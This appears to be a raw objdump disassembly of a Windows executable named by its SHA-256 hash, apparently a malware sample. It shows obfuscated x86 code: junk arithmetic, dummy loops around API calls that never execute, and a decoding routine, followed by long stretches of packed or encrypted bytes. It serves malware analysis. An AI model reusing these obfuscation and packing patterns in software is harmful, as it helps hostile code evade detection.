
28f54c62f02d0314c83024a907f88d131c175ef3c98bd06bce8fc6608ea80531.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	adc    al,0x37
  401006:	cmp    DWORD PTR [ebp+0x0],ecx
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],dh
  40100d:	adc    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ecx],al
  401011:	add    BYTE PTR [eax],al
  401013:	add    BYTE PTR [ecx],al
  401015:	add    BYTE PTR [eax],al
  401017:	add    BYTE PTR [ecx],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax],ch
  40101d:	adc    BYTE PTR [eax],al
  40101f:	add    BYTE PTR [eax+edx*1],ch
  401022:	add    BYTE PTR [eax],al
  401024:	xor    BYTE PTR [eax],dl
  401026:	add    BYTE PTR [eax],al
  401028:	xor    BYTE PTR [eax+eax*1+0x103e00],al
  40102f:	add    BYTE PTR [eax],al
  401031:	add    BYTE PTR [edi+0x6f],dl
  401034:	jb     0x40109a
  401036:	push   edi
  401037:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  40103e:	aas    
  40103f:	inc    ebx
  401040:	ins    BYTE PTR es:[edi],dx
  401041:	outs   dx,DWORD PTR ds:[esi]
  401042:	jae    0x4010a9
  401044:	push   edi
  401045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  40104c:	popa   
  40104d:	je     0x4010b8
  40104f:	outs   dx,DWORD PTR ds:[esi]
  401050:	outs   dx,BYTE PTR ds:[esi]
  401051:	inc    ebx
  401052:	ins    BYTE PTR es:[edi],dx
  401053:	outs   dx,DWORD PTR ds:[esi]
  401054:	jae    0x4010bb
  401056:	push   edi
  401057:	imul   edx,DWORD PTR [ebp-0x75],0xa4ec81ec
  40105e:	add    BYTE PTR [eax],al
  401060:	add    BYTE PTR [ebx+0x3d11084d],cl
  401066:	add    BYTE PTR [eax-0x7a47ffbe],ah
  40106c:	mov    al,BYTE PTR [eax]
  40106e:	add    BYTE PTR [esi+0x33],ah
  401071:	inc    ecx
  401072:	and    BYTE PTR [ebx],ch
  401074:	or     eax,0x42b00c
  401079:	mov    ecx,0x3b4b
  40107e:	xor    DWORD PTR ds:0x429018,0x42b01c
  401088:	add    ax,cx
  40108b:	adc    ecx,DWORD PTR ds:0x42c010
  401091:	movzx  eax,ax
  401094:	mov    ecx,DWORD PTR ds:0x423d7f
  40109a:	mov    ecx,DWORD PTR [ecx]
  40109c:	sub    DWORD PTR ds:0x42d014,ecx
  4010a2:	mov    DWORD PTR [ebp-0x18],eax
  4010a5:	and    DWORD PTR ds:0x42c008,ebx
  4010ab:	mov    BYTE PTR [ebp-0x1],0x61
  4010af:	sbb    ecx,0x3fcf
  4010b5:	lea    eax,[ebp-0x1]
  4010b8:	xor    ecx,ecx
  4010ba:	xor    ecx,DWORD PTR ds:0x429024
  4010c0:	adc    ecx,DWORD PTR ds:0x42b004
  4010c6:	mov    DWORD PTR ds:0x429024,ecx
  4010cc:	mov    DWORD PTR [ebp-0x10],eax
  4010cf:	mov    ecx,DWORD PTR ds:0x42d01c
  4010d5:	sub    DWORD PTR ds:0x42900c,ecx
  4010db:	mov    al,BYTE PTR [ebp-0x1]
  4010de:	mov    ecx,DWORD PTR [ebp-0x10]
  4010e1:	xor    DWORD PTR ds:0x42b004,0x42900c
  4010eb:	xor    al,0x6f
  4010ed:	sub    al,0xd
  4010ef:	adc    DWORD PTR ds:0x42d008,0x362f
  4010f9:	mov    BYTE PTR [ecx],al
  4010fb:	mov    DWORD PTR ds:0x429020,0x1b
  401105:	cmp    DWORD PTR ds:0x429020,0x0
  40110c:	je     0x40113f
  401112:	cmp    DWORD PTR ds:0x429020,0x24
  401119:	jne    0x40112d
  40111f:	push   DWORD PTR [ebp-0x24]
  401122:	push   0x42446b
  401127:	call   DWORD PTR ds:0x425010
  40112d:	mov    ecx,DWORD PTR ds:0x429020
  401133:	dec    ecx
  401134:	mov    DWORD PTR ds:0x429020,ecx
  40113a:	jmp    0x401105
  40113f:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  401146:	push   ebx
  401147:	sub    ecx,eax
  401149:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  401150:	and    DWORD PTR ds:0x42901c,ebx
  401156:	mov    ecx,DWORD PTR [ebp-0x14]
  401159:	push   esi
  40115a:	mov    eax,0x7510893
  40115f:	xor    ecx,eax
  401161:	or     esi,DWORD PTR ds:0x42900c
  401167:	mov    esi,0x3272db
  40116c:	and    DWORD PTR ds:0x429024,0x1a45
  401176:	push   edi
  401177:	sub    DWORD PTR ds:0x42c018,0x2ac6
  401181:	add    ecx,esi
  401183:	mov    DWORD PTR ds:0x42c008,0x57e6
  40118d:	jmp    0x4011bb
  401192:	mov    DWORD PTR ds:0x42a014,0x4932
  40119c:	mov    dl,BYTE PTR [ebp-0x1]
  40119f:	mov    DWORD PTR ds:0x42d014,0x6fce
  4011a9:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  4011b0:	mov    DWORD PTR ds:0x42c010,0x5862
  4011ba:	inc    ecx
  4011bb:	mov    DWORD PTR ds:0x42a018,0x6e07
  4011c5:	cmp    ecx,0x40
  4011c8:	jb     0x401192
  4011ce:	sbb    DWORD PTR ds:0x42a010,0x6c84
  4011d8:	mov    edx,DWORD PTR [ebp-0x14]
  4011db:	add    DWORD PTR ds:0x42b004,0x42900c
  4011e5:	xor    edx,eax
  4011e7:	sub    DWORD PTR ds:0x42c018,0x6b15
  4011f1:	add    edx,esi
  4011f3:	jmp    0x40132b
  4011f8:	add    DWORD PTR ds:0x42b000,ecx
  4011fe:	mov    edi,DWORD PTR [ebp+0x8]
  401201:	mov    DWORD PTR ds:0x42b010,0x1a
  40120b:	cmp    DWORD PTR ds:0x42b010,0x0
  401212:	je     0x40126b
  401218:	cmp    DWORD PTR ds:0x42b010,0x3
  40121f:	jne    0x401233
  401225:	push   0x3d21
  40122a:	push   DWORD PTR [ebp-0x10]
  40122d:	call   DWORD PTR ds:0x425018
  401233:	cmp    DWORD PTR ds:0x42b010,0x4
  40123a:	jne    0x40124f
  401240:	xor    ecx,ecx
  401242:	or     ecx,DWORD PTR ds:0x42b010
  401248:	dec    ecx
  401249:	mov    DWORD PTR ds:0x42b010,ecx
  40124f:	mov    ecx,DWORD PTR ds:0x42b010
  401255:	dec    ecx
  401256:	mov    DWORD PTR ds:0x42b010,ecx
  40125c:	jmp    0x40120b
  401261:	or     DWORD PTR ds:0x429004,0x4238
  40126b:	mov    ecx,0x8a85
  401270:	sbb    DWORD PTR ds:0x42a014,0x4641
  40127a:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40127f:	xor    DWORD PTR ds:0x42901c,edi
  401285:	mov    edi,0x3b4b
  40128a:	add    cx,di
  40128d:	and    DWORD PTR ds:0x42a01c,0x60c1
  401297:	movzx  ecx,cx
  40129a:	mov    DWORD PTR [ebp-0x10],ecx
  40129d:	and    DWORD PTR ds:0x42c014,0x0
  4012a7:	jmp    0x4012b9
  4012ac:	mov    ecx,DWORD PTR ds:0x42c014
  4012b2:	inc    ecx
  4012b3:	mov    DWORD PTR ds:0x42c014,ecx
  4012b9:	cmp    DWORD PTR ds:0x42c014,0x14
  4012c0:	jae    0x4012ec
  4012c6:	cmp    DWORD PTR ds:0x42c014,0x19
  4012cd:	jne    0x4012e5
  4012d3:	push   0x42d008
  4012d8:	push   0x0
  4012da:	push   0x4243ae
  4012df:	call   DWORD PTR ds:0x42501c
  4012e5:	jmp    0x4012ac
  4012ea:	neg    ecx
  4012ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4012ef:	mov    DWORD PTR ds:0x42a000,0x57bf
  4012f9:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012fd:	xor    ecx,0x8a85
  401303:	add    DWORD PTR ds:0x42b00c,0x42c004
  40130d:	add    ecx,edi
  40130f:	movzx  edi,BYTE PTR ds:0x42c018
  401316:	mov    edi,DWORD PTR [ebp-0x10]
  401319:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  401320:	mov    DWORD PTR ds:0x429024,0x374e
  40132a:	inc    edx
  40132b:	mov    ecx,0x6cf1
  401330:	mov    ecx,DWORD PTR [ebp-0x18]
  401333:	cmp    edx,ecx
  401335:	jne    0x4011f8
  40133b:	mov    ecx,DWORD PTR [ebp-0x14]
  40133e:	and    DWORD PTR ds:0x42d014,0x0
  401348:	mov    edx,DWORD PTR ds:0x42d014
  40134e:	inc    edx
  40134f:	mov    DWORD PTR ds:0x42d014,edx
  401355:	cmp    DWORD PTR ds:0x42d014,0x1e
  40135c:	jne    0x401370
  401362:	push   0x42a010
  401367:	push   DWORD PTR [ebp-0xc]
  40136a:	call   DWORD PTR ds:0x425020
  401370:	cmp    DWORD PTR ds:0x42d014,0x1a
  401377:	jb     0x401348
  40137d:	mov    edx,DWORD PTR [ebp+0x10]
  401380:	add    DWORD PTR ds:0x429018,0x42d01c
  40138a:	xor    ecx,eax
  40138c:	add    ecx,esi
  40138e:	mov    DWORD PTR [edx],ecx
  401390:	xor    DWORD PTR ds:0x429020,0x151c
  40139a:	mov    ecx,DWORD PTR [ebp-0x14]
  40139d:	sbb    DWORD PTR ds:0x42a004,0x76e2
  4013a7:	xor    ecx,eax
  4013a9:	add    ecx,esi
  4013ab:	mov    DWORD PTR [ebp-0x20],ecx
  4013ae:	mov    DWORD PTR ds:0x42c00c,0x69f9
  4013b8:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  4013bf:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013c6:	mov    DWORD PTR ds:0x42c00c,ecx
  4013cc:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4013d6:	mov    DWORD PTR ds:0x429004,0x7870
  4013e0:	mov    DWORD PTR [ebp+0x8],ecx
  4013e3:	jmp    0x4015f6
  4013e8:	xor    DWORD PTR ds:0x42a014,0x45a5
  4013f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4013f5:	and    DWORD PTR ds:0x42b008,0x0
  4013ff:	mov    edx,DWORD PTR ds:0x42b008
  401405:	inc    edx
  401406:	mov    DWORD PTR ds:0x42b008,edx
  40140c:	cmp    DWORD PTR ds:0x42b008,0x29
  401413:	jne    0x401424
  401419:	push   0x3311
  40141e:	call   DWORD PTR ds:0x425028
  401424:	cmp    DWORD PTR ds:0x42b008,0x1f
  40142b:	jb     0x4013ff
  401431:	adc    DWORD PTR ds:0x42a008,0x7a1a
  40143b:	mov    edx,DWORD PTR [ebp-0x8]
  40143e:	neg    DWORD PTR ds:0x42b00c
  401444:	xor    ecx,eax
  401446:	xor    DWORD PTR ds:0x429018,0x42b01c
  401450:	xor    edx,eax
  401452:	or     DWORD PTR ds:0x429020,0x5996
  40145c:	sub    ecx,edx
  40145e:	movzx  edx,BYTE PTR ds:0x42a014
  401465:	adc    DWORD PTR ds:0x429028,edx
  40146b:	sub    ecx,esi
  40146d:	xor    DWORD PTR ds:0x429028,0xa7c
  401477:	xor    ecx,eax
  401479:	not    edx
  40147b:	mov    DWORD PTR [ebp+0x8],ecx
  40147e:	add    DWORD PTR ds:0x42a01c,0x480
  401488:	mov    ecx,DWORD PTR [ebp+0x8]
  40148b:	mov    edx,DWORD PTR [ebp-0x64]
  40148e:	or     DWORD PTR ds:0x429028,0x2c95
  401498:	lea    ecx,[edx+ecx*1+0x5708f5]
  40149f:	and    edx,0x1ea1
  4014a5:	mov    DWORD PTR [ebp-0x64],ecx
  4014a8:	and    DWORD PTR ds:0x42c000,0x0
  4014b2:	jmp    0x4014c4
  4014b7:	mov    ecx,DWORD PTR ds:0x42c000
  4014bd:	inc    ecx
  4014be:	mov    DWORD PTR ds:0x42c000,ecx
  4014c4:	cmp    DWORD PTR ds:0x42c000,0x1f
  4014cb:	jae    0x401506
  4014d1:	cmp    DWORD PTR ds:0x42c000,0x2a
  4014d8:	jne    0x401501
  4014de:	push   DWORD PTR [ebp-0x1c]
  4014e1:	push   DWORD PTR [ebp-0x10]
  4014e4:	push   0x42a004
  4014e9:	push   0x8921
  4014ee:	push   DWORD PTR [ebp-0x24]
  4014f1:	push   0x8115
  4014f6:	push   0x4d38
  4014fb:	call   DWORD PTR ds:0x42502c
  401501:	jmp    0x4014b7
  401506:	mov    ecx,DWORD PTR [ebp+0x8]
  401509:	mov    edx,DWORD PTR [ebp-0x60]
  40150c:	sub    DWORD PTR ds:0x42a000,0x42a01c
  401516:	lea    ecx,[edx+ecx*1+0x5708f5]
  40151d:	neg    edx
  40151f:	mov    DWORD PTR [ebp-0x60],ecx
  401522:	adc    DWORD PTR ds:0x42d01c,edx
  401528:	mov    ecx,DWORD PTR [ebp+0x8]
  40152b:	add    DWORD PTR ds:0x429008,0x3e29
  401535:	mov    edx,DWORD PTR [ebp-0x5c]
  401538:	add    DWORD PTR ds:0x429028,0x42b010
  401542:	lea    ecx,[edx+ecx*1+0x5708f4]
  401549:	and    DWORD PTR ds:0x42d008,0x0
  401553:	mov    edx,DWORD PTR ds:0x42d008
  401559:	inc    edx
  40155a:	mov    DWORD PTR ds:0x42d008,edx
  401560:	cmp    DWORD PTR ds:0x42d008,0x8
  401567:	jne    0x401576
  40156d:	push   DWORD PTR [ebp-0x20]
  401570:	call   DWORD PTR ds:0x425030
  401576:	cmp    DWORD PTR ds:0x42d008,0x7
  40157d:	jne    0x401592
  401583:	xor    edx,edx
  401585:	or     edx,DWORD PTR ds:0x42d008
  40158b:	inc    edx
  40158c:	mov    DWORD PTR ds:0x42d008,edx
  401592:	cmp    DWORD PTR ds:0x42d008,0x17
  401599:	jb     0x401553
  40159f:	xor    edx,DWORD PTR ds:0x42d00c
  4015a5:	mov    DWORD PTR [ebp-0x5c],ecx
  4015a8:	sbb    ecx,edx
  4015aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4015ad:	xor    DWORD PTR ds:0x42b01c,0x42c004
  4015b7:	mov    edx,DWORD PTR [ebp-0x58]
  4015ba:	lea    ecx,[edx+ecx*1+0x5708fb]
  4015c1:	xor    edx,0x2bb1
  4015c7:	mov    DWORD PTR [ebp-0x58],ecx
  4015ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4015cd:	mov    edx,DWORD PTR [ebp-0x54]
  4015d0:	adc    DWORD PTR ds:0x429024,0x7906
  4015da:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015e1:	not    edx
  4015e3:	mov    DWORD PTR [ebp-0x54],ecx
  4015e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e9:	mov    edx,DWORD PTR [ebp-0x50]
  4015ec:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015f3:	mov    DWORD PTR [ebp-0x50],ecx
  4015f6:	dec    ecx
  4015f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4015fa:	xor    ecx,eax
  4015fc:	or     DWORD PTR ds:0x42d000,0x34f3
  401606:	add    ecx,esi
  401608:	mov    DWORD PTR ds:0x42c01c,0x3161
  401612:	jne    0x4013e8
  401618:	mov    DWORD PTR ds:0x429018,0x1b23
  401622:	jmp    0x405fe7
  401627:	mov    ecx,DWORD PTR [ebp-0x1c]
  40162a:	and    DWORD PTR ds:0x42c000,0x0
  401634:	jmp    0x401648
  401639:	xor    edx,edx
  40163b:	xor    edx,DWORD PTR ds:0x42c000
  401641:	inc    edx
  401642:	mov    DWORD PTR ds:0x42c000,edx
  401648:	cmp    DWORD PTR ds:0x42c000,0x15
  40164f:	jae    0x4016e1
  401655:	cmp    DWORD PTR ds:0x42c000,0xa
  40165c:	jne    0x40166e
  401662:	push   DWORD PTR [ebp-0x14]
  401665:	push   DWORD PTR [ebp-0x14]
  401668:	call   DWORD PTR ds:0x425034
  40166e:	cmp    DWORD PTR ds:0x42c000,0x9
  401675:	jne    0x40168a
  40167b:	xor    edx,edx
  40167d:	add    edx,DWORD PTR ds:0x42c000
  401683:	inc    edx
  401684:	mov    DWORD PTR ds:0x42c000,edx
  40168a:	jmp    0x401639
  40168f:	and    DWORD PTR ds:0x42c000,0x0
  401699:	mov    edx,DWORD PTR ds:0x42c000
  40169f:	inc    edx
  4016a0:	mov    DWORD PTR ds:0x42c000,edx
  4016a6:	cmp    DWORD PTR ds:0x42c000,0x1e
  4016ad:	jne    0x4016c6
  4016b3:	push   0x42430e
  4016b8:	push   0x424417
  4016bd:	push   DWORD PTR [ebp-0x18]
  4016c0:	call   DWORD PTR ds:0x42503c
  4016c6:	cmp    DWORD PTR ds:0x42c000,0x12
  4016cd:	jb     0x401699
  4016d3:	xor    edx,edx
  4016d5:	xor    edx,DWORD PTR ds:0x429010
  4016db:	sub    DWORD PTR ds:0x42a01c,edx
  4016e1:	mov    edx,DWORD PTR [ebp-0x8]
  4016e4:	xor    ecx,eax
  4016e6:	xor    edx,eax
  4016e8:	add    DWORD PTR ds:0x429014,0x42d010
  4016f2:	sub    ecx,edx
  4016f4:	mov    DWORD PTR ds:0x42d00c,0x49b3
  4016fe:	sub    ecx,esi
  401700:	xor    ecx,eax
  401702:	mov    DWORD PTR ds:0x42901c,0x3f4e
  40170c:	mov    DWORD PTR [ebp-0x1c],ecx
  40170f:	mov    ecx,DWORD PTR ds:0x42b014
  401715:	mov    ecx,DWORD PTR [ebp-0xc]
  401718:	mov    DWORD PTR [ebp+0x8],ecx
  40171b:	jmp    0x40174d
  401720:	mov    ecx,DWORD PTR [ebp+0x8]
  401723:	mov    edx,DWORD PTR [ebp-0x8]
  401726:	xor    ecx,eax
  401728:	xor    edx,eax
  40172a:	sub    ecx,edx
  40172c:	sub    ecx,esi
  40172e:	xor    ecx,eax
  401730:	mov    DWORD PTR [ebp+0x8],ecx
  401733:	mov    ecx,DWORD PTR [ebp+0x8]
  401736:	mov    edx,DWORD PTR [ebp+0x8]
  401739:	imul   edx,edx,0x5708f5
  40173f:	xor    ecx,eax
  401741:	add    ecx,esi
  401743:	lea    ecx,[ebp+ecx*4-0x64]
  401747:	mov    edi,DWORD PTR [ecx]
  401749:	add    edx,edi
  40174b:	mov    DWORD PTR [ecx],edx
  40174d:	mov    ecx,DWORD PTR [ebp+0x8]
  401750:	xor    ecx,eax
  401752:	add    ecx,esi
  401754:	jne    0x401720
  40175a:	mov    ecx,DWORD PTR [ebp-0x20]
  40175d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401764:	mov    dl,BYTE PTR [ebp-0x1]
  401767:	cmp    cl,dl
  401769:	je     0x405f48
  40176f:	mov    ecx,DWORD PTR [ebp-0x20]
  401772:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401779:	mov    edx,DWORD PTR [ebp+0xc]
  40177c:	cmp    cl,BYTE PTR [edx]
  40177e:	jne    0x405ff9
  401784:	mov    ecx,DWORD PTR [ebp-0x14]
  401787:	mov    edx,DWORD PTR [ebp+0xc]
  40178a:	movsx  edx,BYTE PTR [edx]
  40178d:	xor    ecx,eax
  40178f:	add    ecx,esi
  401791:	jmp    0x403b14
  401796:	add    al,0xcb
  401798:	xchg   edi,eax
  401799:	dec    esp
  40179a:	xchg   edi,eax
  40179b:	in     al,0x63
  40179d:	sbb    DWORD PTR [edx],0xffffff98
  4017a0:	adc    al,0xee
  4017a2:	pushf  
  4017a3:	test   al,0x14
  4017a5:	jns    0x401809
  4017a7:	bound  esp,QWORD PTR [edx+0x62]
  4017aa:	sbb    al,0x5f
  4017ac:	bound  esp,QWORD PTR [edx+0x9]
  4017af:	xor    BYTE PTR [edi],al
  4017b1:	cmp    eax,0xf033905
  4017b6:	jns    0x4017de
  4017b8:	jne    0x401830
  4017ba:	pop    eax
  4017bb:	jl     0x40182f
  4017bd:	jb     0x401830
  4017bf:	sub    bl,cl
  4017c1:	sar    ch,0x4c
  4017c4:	push   esp
  4017c5:	jae    0x401844
  4017c7:	inc    ebx
  4017c8:	mov    WORD PTR [ecx+esi*2+0x45],?
  4017cc:	scas   eax,DWORD PTR es:[edi]
  4017cd:	inc    ecx
  4017ce:	push   edx
  4017cf:	cmp    al,0x90
  4017d1:	loop   0x40176a
  4017d3:	inc    di
  4017d5:	push   ecx
  4017d6:	jg     0x4017ff
  4017d8:	ins    BYTE PTR es:[edi],dx
  4017d9:	mov    dh,0x7f
  4017db:	mov    esp,0xff3023ba
  4017e0:	jbe    0x4017a2
  4017e2:	loop   0x40182f
  4017e4:	jg     0x401804
  4017e6:	icebp  
  4017e7:	and    eax,0x97f1a2d1
  4017ec:	or     ebx,esi
  4017ee:	xchg   ebx,eax
  4017ef:	xor    eax,0x92b345ef
  4017f4:	fsub   st,st(7)
  4017f6:	jno    0x4017b9
  4017f8:	sbb    al,cl
  4017fa:	out    dx,al
  4017fb:	loop   0x401833
  4017fd:	add    al,0x54
  4017ff:	adc    BYTE PTR [esi],dh
  401801:	jae    0x401877
  401803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401804:	(bad)  
  401805:	or     ebx,DWORD PTR [ebp+0x19]
  401808:	mov    dh,0xff
  40180a:	cmc    
  40180b:	push   ebp
  40180c:	xor    ebp,DWORD PTR [eax+0x2a]
  40180f:	aam    0x43
  401811:	in     eax,0x2
  401813:	loop   0x401879
  401815:	mov    ebp,0x5f84c17b
  40181a:	xchg   ebx,eax
  40181b:	mov    ebp,0x2d9a0817
  401820:	jmp    0x4017c0
  401822:	and    BYTE PTR [edx+0x6b],ch
  401825:	adc    eax,edx
  401827:	xor    DWORD PTR [edx-0x6f],ecx
  40182a:	sub    BYTE PTR [ebx],ch
  40182c:	dec    eax
  40182d:	sti    
  40182e:	scas   eax,DWORD PTR es:[edi]
  40182f:	xchg   edx,eax
  401830:	xor    eax,0xd0a7ac95
  401835:	xchg   esp,eax
  401836:	dec    ebp
  401837:	clc    
  401838:	pop    ecx
  401839:	dec    edx
  40183a:	push   eax
  40183b:	adc    BYTE PTR [esi],bh
  40183d:	jmp    0x401865
  40183f:	sbb    esi,DWORD PTR [ecx+0x2cb7d253]
  401845:	fcomp  QWORD PTR [eax]
  401847:	inc    esi
  401848:	loope  0x401894
  40184a:	inc    esi
  40184b:	mov    ecx,0xe4bf74e5
  401850:	pop    edx
  401851:	push   ds
  401852:	or     ah,bl
  401854:	sbb    eax,DWORD PTR [ecx+ebp*4+0x26]
  401858:	ror    ebp,0x63
  40185b:	mov    ah,0xc7
  40185d:	in     al,0x36
  40185f:	mov    ds:0xb78fb1f1,al
  401864:	or     ch,al
  401866:	(bad)  
  401867:	sub    al,0xc
  401869:	cs sub esp,esp
  40186c:	sbb    al,0xee
  40186e:	mov    ecx,0xcc6e57f6
  401873:	lds    edi,FWORD PTR [edx]
  401875:	in     eax,0xf2
  401877:	and    ah,BYTE PTR [ebx+0x1ea865e2]
  40187d:	loop   0x40185a
  40187f:	dec    edi
  401880:	stc    
  401881:	mov    ebp,0x53760d4b
  401886:	jmp    0xebea4ba4
  40188b:	inc    BYTE PTR [ebp+ebx*4+0x7d]
  40188f:	pushaw 
  401891:	mov    esi,0xd2cb630d
  401896:	mov    edx,0xc4347388
  40189b:	retf   
  40189c:	pop    edi
  40189d:	fs js  0x401894
  4018a0:	scas   al,BYTE PTR es:[edi]
  4018a1:	sahf   
  4018a2:	sar    BYTE PTR [ecx-0x2a],0xca
  4018a6:	test   al,0x5a
  4018a8:	imul   ebx,DWORD PTR [eax+0x519531b9],0x938569e4
  4018b2:	mov    ch,0x54
  4018b4:	fimul  WORD PTR ds:0x85f158f3
  4018ba:	js     0x40190f
  4018bc:	repz leave 
  4018be:	fcmovnb st,st(6)
  4018c0:	dec    esi
  4018c1:	popa   
  4018c2:	add    al,0x1a
  4018c4:	xor    esi,ebp
  4018c6:	ins    BYTE PTR es:[edi],dx
  4018c7:	push   edi
  4018c8:	aas    
  4018c9:	mov    cl,0x69
  4018cb:	dec    eax
  4018cc:	sbb    dh,BYTE PTR [eax]
  4018ce:	aam    0x6c
  4018d0:	inc    esp
  4018d1:	jb     0x40186a
  4018d3:	mov    ah,0xe3
  4018d5:	loopne 0x40188f
  4018d7:	test   BYTE PTR [edx-0x52e732f2],0xe1
  4018de:	retf   0x9afa
  4018e1:	mov    fs,WORD PTR [edx+0x61]
  4018e4:	push   edi
  4018e5:	lock or BYTE PTR [edi+0x37d8e54],0xd
  4018ed:	daa    
  4018ee:	xor    bl,BYTE PTR [esi+0x22bdd6da]
  4018f4:	sbb    al,0x2
  4018f6:	lds    esi,FWORD PTR [ebx+0x2373df43]
  4018fc:	and    DWORD PTR [ebx+0x37],edx
  4018ff:	mov    dh,0x18
  401901:	sub    BYTE PTR [edx],dl
  401903:	ret    0x7c22
  401906:	xchg   DWORD PTR [ecx-0x1a],eax
  401909:	mov    bh,0x75
  40190b:	fmul   st,st(7)
  40190d:	push   ecx
  40190e:	cmp    dh,dh
  401910:	loopne 0x40198a
  401912:	sbb    edi,DWORD PTR [ebp-0x3d773532]
  401918:	mov    BYTE PTR [ebx-0x4c],ch
  40191b:	jp     0x401984
  40191d:	mov    WORD PTR [edx+0x56b11557],?
  401923:	sub    eax,0x687e7d24
  401928:	jge    0x401986
  40192a:	or     al,0x17
  40192c:	lock xor esp,edi
  40192f:	dec    eax
  401930:	mov    ebp,0x362645bd
  401935:	sub    DWORD PTR [edi],0x68
  401938:	xchg   ebp,eax
  401939:	jbe    0x4018d6
  40193b:	dec    ebx
  40193c:	dec    ebx
  40193d:	ror    BYTE PTR [ecx-0x7bcbaed],cl
  401943:	(bad)  
  401944:	out    0xb,al
  401946:	pop    eax
  401947:	and    al,0x78
  401949:	mov    ds:0xd293cdb4,al
  40194e:	in     al,dx
  40194f:	add    eax,0x2dbe73ea
  401954:	scas   al,BYTE PTR es:[edi]
  401955:	iret   
  401956:	jg     0x40193f
  401958:	jno    0x401955
  40195a:	loope  0x401932
  40195c:	adc    DWORD PTR [ecx],edi
  40195e:	(bad)  [edx-0x4a]
  401961:	sub    eax,0x31e2643
  401966:	into   
  401967:	adc    DWORD PTR [ecx],eax
  401969:	adc    edi,edx
  40196b:	stos   DWORD PTR es:[edi],eax
  40196c:	mov    ebp,0x53b683de
  401971:	in     al,0x85
  401973:	shl    DWORD PTR [ebx-0x5f],1
  401976:	add    esi,ecx
  401978:	nop
  401979:	inc    ebx
  40197a:	pusha  
  40197b:	lods   al,BYTE PTR ds:[esi]
  40197c:	mov    cl,0x31
  40197e:	ss cmp eax,0xf18a8aff
  401984:	arpl   WORD PTR [edx-0x48],di
  401987:	or     ah,cl
  401989:	lods   eax,DWORD PTR ds:[esi]
  40198a:	fcomp  QWORD PTR cs:[ebx+0x718af74b]
  401991:	or     BYTE PTR [ebx],dh
  401993:	jecxz  0x40195c
  401995:	add    ah,ah
  401997:	or     DWORD PTR [ecx],0x2f
  40199a:	or     BYTE PTR [edx+0x52a33f8a],bh
  4019a0:	(bad)  
  4019a1:	into   
  4019a2:	sbb    bl,BYTE PTR ss:[eax]
  4019a5:	out    0x41,al
  4019a7:	ja     0x40195b
  4019a9:	sbb    BYTE PTR [edx+0x68bdb0eb],cl
  4019af:	sti    
  4019b0:	inc    eax
  4019b1:	sbb    eax,0x719cc48a
  4019b6:	push   ss
  4019b7:	mov    ebp,0xd897a690
  4019bc:	xor    DWORD PTR [ebx+ecx*8-0x19],edi
  4019c0:	mov    ?,ebp
  4019c2:	inc    eax
  4019c3:	push   cs
  4019c4:	push   ebx
  4019c5:	into   
  4019c6:	ss pushf 
  4019c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019c9:	cmp    eax,0xb91e6946
  4019ce:	fcom   QWORD PTR [esi-0x16]
  4019d1:	ja     0x4019a0
  4019d3:	call   0x79a8:0x62dd68fa
  4019da:	push   ds
  4019db:	cmp    ah,cl
  4019dd:	les    eax,FWORD PTR [edi]
  4019df:	cwde   
  4019e0:	xchg   ecx,eax
  4019e1:	iret   
  4019e2:	jle    0x401a0e
  4019e4:	xchg   ebp,eax
  4019e5:	jae    0x401a63
  4019e7:	xor    DWORD PTR [esi-0xceebd80],ebx
  4019ed:	adc    BYTE PTR [eax],dl
  4019ef:	dec    esi
  4019f0:	sub    cl,BYTE PTR [edx]
  4019f2:	pop    ebx
  4019f3:	stos   DWORD PTR es:[edi],eax
  4019f4:	mov    fs,ebx
  4019f6:	xchg   esi,eax
  4019f7:	inc    ecx
  4019f8:	mov    WORD PTR [ebx],cs
  4019fa:	mov    ah,0xed
  4019fc:	mov    bl,0xe4
  4019fe:	ins    DWORD PTR es:[edi],dx
  4019ff:	loopne 0x40199a
  401a01:	inc    esi
  401a02:	xor    BYTE PTR [edi],cl
  401a04:	pop    esp
  401a05:	in     eax,dx
  401a06:	nop
  401a07:	cmp    eax,0xb9ce2f87
  401a0c:	mov    al,ds:0x3c44635c
  401a11:	out    0x1e,eax
  401a13:	fucomip st,st(6)
  401a15:	xlat   BYTE PTR ds:[ebx]
  401a16:	cmp    eax,0x3343f376
  401a1b:	or     ebx,DWORD PTR [eax]
  401a1d:	test   ecx,esp
  401a1f:	int    0x16
  401a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a22:	loop   0x401a7d
  401a24:	push   0x16ae54c1
  401a29:	enter  0xf355,0x85
  401a2d:	fsubp  st(0),st
  401a2f:	jns    0x4019d7
  401a31:	mov    bh,0x8e
  401a33:	mov    esi,?
  401a35:	frstor [ebp+0x52bf5b73]
  401a3b:	cmp    DWORD PTR [ebx-0xb],esi
  401a3e:	aas    
  401a3f:	push   0x710f8782
  401a44:	int    0xa
  401a46:	mov    esi,0xba868a80
  401a4b:	scas   al,BYTE PTR es:[edi]
  401a4c:	call   0xbed7cbe8
  401a51:	push   0x838dd2e6
